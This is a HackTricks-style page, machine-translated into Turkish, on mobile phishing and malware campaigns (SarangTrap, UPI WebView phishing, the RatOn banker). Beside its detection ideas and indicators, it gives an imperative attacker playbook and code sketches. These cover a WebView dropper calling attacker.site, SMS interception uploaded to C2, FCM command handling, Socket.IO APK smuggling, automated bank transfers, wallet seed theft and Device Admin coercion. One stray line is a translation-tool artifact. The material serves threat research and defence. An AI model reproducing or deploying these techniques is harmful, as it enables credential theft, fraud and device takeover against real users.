# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfa tehdit aktörlerinin **malicious Android APKs** ve **iOS mobile-configuration profiles** dağıtmak için kullandığı teknikleri kapsar (phishing, SEO, social engineering, fake stores, dating apps, vb.).
> İçerik, Zimperium zLabs (2025) tarafından ortaya çıkarılan SarangTrap kampanyasından ve diğer açık araştırmalardan uyarlanmıştır.

## Saldırı Akışı

1. **SEO/Phishing Infrastructure**
* Dating, cloud share, car service gibi look-alike domainlerin onlarcasını kaydedin.
– `<title>` elementinde yerel dil anahtar kelimeleri ve emoji kullanarak Google'da sıralama alın.
– Aynı landing page üzerinde hem Android (`.apk`) hem de iOS kurulum talimatlarını barındırın.
2. **İlk Aşama İndirme**
* Android: imzasız veya “third-party store” APK'ya doğrudan bağlantı.
* iOS: `itms-services://` veya düz HTTPS bağlantısı ile kötü amaçlı bir **mobileconfig** profiline yönlendirme (aşağıya bakınız).
3. **Kurulum Sonrası Social Engineering**
* İlk çalıştırmada uygulama bir **invitation / verification code** ister (özel erişim yanılsaması).
* Kod Command-and-Control (C2)'ye **HTTP üzerinden POSTed** edilir.
* C2 `{"success":true}` ile yanıt verir ➜ malware devam eder.
* Geçerli bir kod göndermeyen Sandbox/AV dinamik analizi **no malicious behaviour** görür (evasion).
4. **Çalışma Zamanı İzin Suistimali (Android)**
* Tehlikeli izinler yalnızca C2'den olumlu yanıt alındıktan sonra istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Yeni varyantlar SMS için `<uses-permission>` öğesini `AndroidManifest.xml`'den kaldırır ama Java/Kotlin kod yolunu refleksiyonla SMS okuyan şekilde bırakır ⇒ statik puanı düşürürken, AppOps suistimali veya eski hedeflerde izni veren cihazlarda hâlâ işlevseldir.
5. **Facade UI & Background Collection**
* Uygulama yerel olarak uygulanmış zararsız görünümler (SMS viewer, gallery picker) gösterir.
* Bu sırada exfiltrates:
- IMEI / IMSI, telefon numarası
- Tam `ContactsContract` dökümü (JSON array)
- `/sdcard/DCIM` içindeki JPEG/PNG'ler [Luban](https://github.com/Curzibn/Luban) ile sıkıştırılarak boyut küçültülür
- Opsiyonel SMS içeriği (`content://sms`)
Payloadlar **batch-zipped** edilip `HTTP POST /upload.php` ile gönderilir.
6. **iOS Delivery Technique**
* Tek bir **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyerek cihazı “MDM” benzeri denetimde kaydedebilir.
* Social-engineering talimatları:
1. Ayarlar ➜ *Profile downloaded*'ı açın.
2. *Install*'e üç kez dokunun (phishing page üzerindeki ekran görüntüleri).
3. İmzasız profile güvenin ➜ attacker App Store incelemesi olmadan *Contacts* ve *Photo* yetkisini kazanır.
7. **Ağ Katmanı**
* Düz HTTP, genellikle port 80 üzerinde ve HOST header `api.<phishingdomain>.com` gibi.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → kolay fark edilir).

## Defensive Testing / Red-Team İpuçları

* **Dynamic Analysis Bypass** – Malware değerlendirmesi sırasında, davet kodu aşamasını Frida/Objection ile otomatikleştirerek kötü niyetli dala ulaşın.
* **Manifest vs. Runtime Diff** – `aapt dump permissions` ile runtime `PackageManager#getRequestedPermissions()`'ı karşılaştırın; tehlikeli izinlerin eksik olması kırmızı bayraktır.
* **Network Canary** – Kod girişinden sonra şüpheli POST patlamalarını tespit etmek için `iptables -p tcp --dport 80 -j NFQUEUE` yapılandırın.
* **mobileconfig Inspection** – macOS'ta `security cms -D -i profile.mobileconfig` kullanarak `PayloadContent` listesini inceleyin ve fazla yetkileri tespit edin.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** ile anahtar kelime zengini domainlerdeki ani patlamaları yakalayın.
* **User-Agent & Path Regex**: Dalvik istemcilerinden Google Play dışı `(?i)POST\s+/(check|upload)\.php` isteğini arayın.
* **Invite-code Telemetry** – APK kurulumundan kısa süre sonra 6–8 haneli sayısal kodların POST edilmesi staging göstergesi olabilir.
* **MobileConfig Signing** – MDM politikasıyla imzasız konfigürasyon profillerini engelleyin.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Göstergeler (Genel)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Bu pattern, hükümet-yardımı temalarını suistimal eden kampanyalarda Hint UPI kimlik bilgileri ve OTP'leri çalmak için gözlemlenmiştir. Operatörler teslimat ve dayanıklılık için güvenilir platformları zincir halinde kullanır.

### Delivery chain across trusted platforms
- YouTube video tuzağı → açıklama kısa bir link içerir
- Kısa link → gerçek portalı taklit eden GitHub Pages phishing sitesi
- Aynı GitHub repo, dosyaya doğrudan bağlanan sahte “Google Play” rozeti olan bir APK barındırır
- Dinamik phishing sayfaları Replit'te barınır; uzaktan komut kanalı Firebase Cloud Messaging (FCM) kullanır

### Dropper with embedded payload and offline install
- İlk APK, gerçek kötü yazılımı `assets/app.apk` konumunda taşıyan bir installer (dropper) olup, bulut tespitini zayıflatmak için kullanıcıyı Wi‑Fi/mobile data'yı devre dışı bırakmaya yönlendirir.
- Gömülü payload zararsız görünen bir etiket altında kurulur (ör. “Secure Update”). Kurulumdan sonra hem installer hem de payload ayrı uygulamalar olarak mevcut olur.

Statik triyaj ipucu (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink aracılığıyla dinamik endpoint keşfi
- Malware, bir shortlink'ten düz metin, virgülle ayrılmış canlı endpoints listesini çeker; basit string transforms son phishing sayfa yolunu üretir.
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” adımı, dinamik endpoint içindeki bir saldırgan HTML formunu WebView içinde yükler ve hassas alanları (telefon, banka, UPI PIN) yakalar; bu alanlar `POST` ile `addup.php`'ye gönderilir.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation ve SMS/OTP interception
- İlk çalıştırmada agresif izinler istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kişiler döngüye alınarak mağdurun cihazından toplu smishing SMS'leri gönderilir.
- Gelen SMS'ler bir broadcast receiver tarafından yakalanıp meta verilerle (gönderen, içerik, SIM yuvası, cihaz başına rastgele ID) `/addsm.php`'ye yüklenir.

Receiver taslağı:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) dayanıklı bir C2 olarak
- Payload, FCM'ye kaydolur; push mesajları `_type` alanını taşır; bu alan eylemleri tetiklemek için bir anahtar olarak kullanılır (ör. phishing metin şablonlarını güncellemek, davranışları açıp kapatmak).

Örnek FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler taslağı:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Avlanma kalıpları ve IOCs
- APK, `assets/app.apk` içinde ikincil payload içerir
- WebView, `gate.htm`'den ödeme yükler ve `/addup.php`'ye exfiltrates
- SMS exfiltration `/addsm.php`'ye
- Kısa bağlantı tabanlı konfigürasyon çekimi (örn. `rebrand.ly/*`) CSV endpoint'leri döndürür
- Genel “Update/Secure Update” olarak etiketlenmiş uygulamalar
- Güvenilmeyen uygulamalarda `_type` ayrıştırıcısına sahip FCM `data` mesajları

### Tespit & savunma fikirleri
- Kurulum sırasında kullanıcılara ağı devre dışı bırakmalarını söyleyen ve ardından `assets/`'ten ikinci bir APK side-load eden uygulamaları işaretle.
- İzin kümesi için uyarı ver: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView tabanlı ödeme akışları.
- Kurumsal olmayan hostlarda `POST /addup.php|/addsm.php` için çıkış trafiği izleme; bilinen altyapıları engelle.
- Mobile EDR kuralları: FCM'ye kayıt olan ve `_type` alanına göre dallanan güvenilmeyen uygulamalar.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Saldırganlar statik APK linklerini giderek daha fazla, Google Play görünümlü aldatmacalara gömülmüş bir Socket.IO/WebSocket kanalıyla değiştiriyor. Bu, payload URL'ini gizler, URL/extension filtrelerini atlatır ve gerçekçi bir kurulum UX'i korur.

Gerçek dünyada gözlemlenen tipik istemci akışı:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Neden basit kontrollerden kaçtığı:
- Hiçbir statik APK URL'si ifşa edilmez; payload WebSocket framelerinden bellekte yeniden oluşturulur.
- Doğrudan .apk cevaplarını engelleyen URL/MIME/uzantı filtreleri, WebSockets/Socket.IO üzerinden tünellenen ikili veriyi kaçırabilir.
- WebSocket'leri çalıştırmayan crawler'lar ve URL sandbox'lar payload'ı alamaz.

Avlama ve tespit fikirleri:
- Web/network telemetry: büyük ikili parçalar transfer eden WebSocket oturumlarını işaretleyin; bunları takiben MIME application/vnd.android.package-archive olan bir Blob oluşturulması ve programatik bir `<a download>` tıklaması gerçekleşiyor mu bakın. socket.emit('startDownload') gibi istemci dizelerini ve sayfa script'lerinde chunk, downloadProgress, downloadComplete adlı events'leri arayın.
- Play-store spoof heuristics: Play-benzeri sayfalar sunan Google dışı alan adlarında, http.html:"VfPpkd-jY41G-V67aGc" gibi Google Play UI dizelerini, karışık-dilde şablonları ve WS events tarafından yönlendirilen sahte “verification/progress” akışlarını arayın.
- Controls: non-Google origin'lerden APK teslimatını engelleyin; WebSocket trafiğini de kapsayan MIME/uzantı politikalarını uygulayın; tarayıcı güvenli-indirme uyarılarını koruyun.

Ayrıca bkz. WebSocket tradecraft ve tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn vaka incelemesi

RatOn banker/RAT kampanyası (ThreatFabric), modern mobil phishing operasyonlarının WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover ve hatta NFC-relay orchestration öğelerini nasıl harmanladığına dair somut bir örnektir. Bu bölüm yeniden kullanılabilir teknikleri soyutlar.

### Aşama-1: WebView → native install bridge (dropper)
Saldırganlar, saldırgan sayfasına işaret eden bir WebView sunar ve native installer'ı açığa çıkaran bir JavaScript arayüzü enjekte eder. Bir HTML butonuna dokunuş, dropper'ın assets'inde paketlenmiş ikinci aşama bir APK'yı kuran native koda çağrı yapar ve ardından onu doğrudan başlatır.

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
İçerik görünmüyor — lütfen çevirmemi istediğiniz HTML'i buraya yapıştırın.
```html
<button onclick="bridge.installApk()">Install</button>
```
Yüklemeden sonra, dropper explicit package/activity aracılığıyla payload'ı başlatır:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Tehdit avı fikri: güvenilmeyen uygulamaların `addJavascriptInterface()` çağırıp WebView'e yükleyici-benzeri yöntemler açması; APK'nin `assets/` altında gömülü ikincil bir payload taşıması ve Package Installer Session API'yi çağırması.

### İzin hunisi: Accessibility + Device Admin + izleyen runtime istemleri
Stage-2 bir WebView açar ve “Access” sayfasını barındırır. Sayfadaki buton, kurbanı Accessibility ayarlarına yönlendiren ve rogue servisin etkinleştirilmesini isteyen exported bir methodu çağırır. İzin verildikten sonra, malware Accessibility'yi kullanarak sonraki runtime izin diyaloglarında (contacts, overlay, manage system settings, vb.) otomatik tıklamalar yapar ve Device Admin ister.

- Accessibility, node-tree içinde “Allow”/“OK” gibi düğmeleri bularak ve tıklama etkinliklerini tetikleyerek sonraki istemleri programlı olarak kabul etmeye yardımcı olur.
- Overlay izin kontrolü/isteği:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Ayrıca bakınız:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/fidye via WebView
Operatörler şu komutları verebilir:
- bir URL'den tam ekran overlay göstermek, veya
- WebView overlay içine yüklenecek inline HTML iletmek.

Muhtemel kullanımlar: zorlayarak PIN girişi, PIN'leri yakalamak için cüzdan açtırma, fidye mesajları. Eksikse overlay izninin verildiğinden emin olmak için bir komut bulundurun.

### Remote control model – text pseudo-screen + screen-cast
- Düşük bant genişliği: periyodik olarak Accessibility node tree'i dök, görünen metinleri/rolleri/bounds'u serileştir ve sahte ekran olarak C2'ye gönder (örnek komutlar: `txt_screen` bir kerelik, `screen_live` sürekli).
- Yüksek doğruluk: MediaProjection isteğinde bulunup isteğe bağlı olarak ekran yayını/kayıt başlat (örnek komutlar: `display` / `record`).

### ATS playbook (banka uygulaması otomasyonu)
Verilen bir JSON görevi ile banka uygulamasını aç, Accessibility aracılığıyla metin sorguları ve koordinat tıklamaları karışımıyla UI'yi yönlendir ve istendiğinde kurbanın ödeme PIN'ini gir.

Örnek görev:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Yeni ödeme"
- "Zadat platbu" → "Ödeme gir"
- "Nový příjemce" → "Yeni alıcı"
- "Domácí číslo účtu" → "Yurtiçi hesap numarası"
- "Další" → "İleri"
- "Odeslat" → "Gönder"
- "Ano, pokračovat" → "Evet, devam et"
- "Zaplatit" → "Öde"
- "Hotovo" → "Tamam"

Operatörler ayrıca transfer limitlerini `check_limit` ve `limit` gibi komutlarla kontrol edebilir veya artırabilir; bu komutlar limitler UI'sinde benzer şekilde gezinir.

### Crypto wallet seed extraction
Hedefler: MetaMask, Trust Wallet, Blockchain.com, Phantom. Akış: unlock (çalınmış PIN veya sağlanan parola), Security/Recovery'e gidin, seed phrase'i reveal/show edin, keylog/exfiltrate edin. Dil farklılıklarında gezinmeyi stabil hale getirmek için locale-aware selectors (EN/RU/CZ/SK) uygulayın.

### Device Admin coercion
Device Admin APIs, PIN yakalama fırsatlarını artırmak ve kurbanın eylemlerini zorlaştırmak için kullanılır:

- Anında kilitleme:
```java
dpm.lockNow();
```
- Mevcut kimlik bilgilerinin süresini sona erdirip değişikliği zorunlu kıl (Accessibility yeni PIN/parolayı yakalar):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard biometric features'i devre dışı bırakarak biyometrik olmayan kilit açmayı zorla:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### NFC relay orkestrasyonu (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operatör komut seti (örnek)
- UI/durum: `txt_screen`, `screen_live`, `display`, `record`
- Sosyal: `send_push`, `Facebook`, `WhatsApp`
- Overlay'lar: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Cüzdanlar: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Cihaz: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- İletişim/Keşif: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Tespit & savunma fikirleri (RatOn-style)
- WebViews with `addJavascriptInterface()` exposing installer/permission methods için tarama yapın; Accessibility istemlerini tetikleyen “/access” ile biten sayfaları izleyin.
- Servis erişimi verildikten kısa süre sonra yüksek oranlı Accessibility jestleri/tıklamaları üreten uygulamalar için uyarı verin; C2'ye gönderilen Accessibility node dumps'a benzeyen telemetriyi yakalayın.
- Güvenilmeyen uygulamalarda Device Admin politika değişikliklerini izleyin: `lockNow`, password expiration, keyguard özelliklerinin açma/kapama değişiklikleri.
- Kurumsal olmayan uygulamalardan gelen MediaProjection istemleri ve bunları takiben periyodik frame yüklemeleri için uyarı verin.
- Bir uygulama tarafından tetiklenen harici bir NFC-relay uygulamasının installation/launch işlemlerini tespit edin.
- Bankacılık için: out-of-band confirmations, biometrics-binding ve cihaz üzeri otomasyona dayanıklı transaction-limits zorunlu kılın.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
